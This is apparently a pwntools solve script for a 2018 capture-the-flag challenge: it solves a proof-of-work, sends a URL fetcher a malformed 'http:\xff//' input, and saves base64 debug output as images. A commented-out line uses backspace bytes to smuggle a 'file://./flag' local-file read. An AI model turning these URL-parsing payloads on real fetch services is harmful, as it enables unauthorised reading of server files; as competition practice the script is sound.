#!/usr/bin/env python
#coding:utf-8
from __future__ import print_function
from pwn import *
import base64
context(os='linux', arch='amd64', log_level='debug')
import sys
import struct
import hashlib
context.log_level ='debug'

def pow_hash(challenge, solution):
	return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
	h = pow_hash(challenge, solution)
	return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
	candidate = 0
	while True:
		if check_pow(challenge, n, candidate):
			return candidate
		candidate += 1

def original_main():
	challenge = sys.argv[1]
	n = int(sys.argv[2])

	print('Solving challenge: "{}", n: {}'.format(challenge, n))

	solution = solve_pow(challenge, n)
	print('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))

def calc_pow():
	p.recvuntil('Challenge: ')
	challenge = p.recvline().strip()
	p.recvuntil('n: ')
	n = int(p.recvline().strip())

	log.info("challenge:{},n: {}".format(challenge,n))
	sol = solve_pow(challenge,n)
	p.recvuntil('Solution:')
	p.sendline(str(sol))

p = remote('ddee3e1a.quals2018.oooverflow.io',31337)

calc_pow()

p.readuntil('What URL would you like this old dog to fetch?')
#p.sendline('http://' + '\x08' * len('http://') + 'file://./flag')
p.sendline('http:\xff//guthib.com')
p.recvuntil('Booting up')


def read_output(num):
	p.recvuntil('DEBUG ')
	s = p.readuntil('\n')[:-1]
	bin = open(str(num)+'.png','wb')
	bin.write(base64.b64decode(s))
	bin.close()


num = 10
while True:
	try:
		read_output(num)
		num+=1
	except Exception as e:
		continue
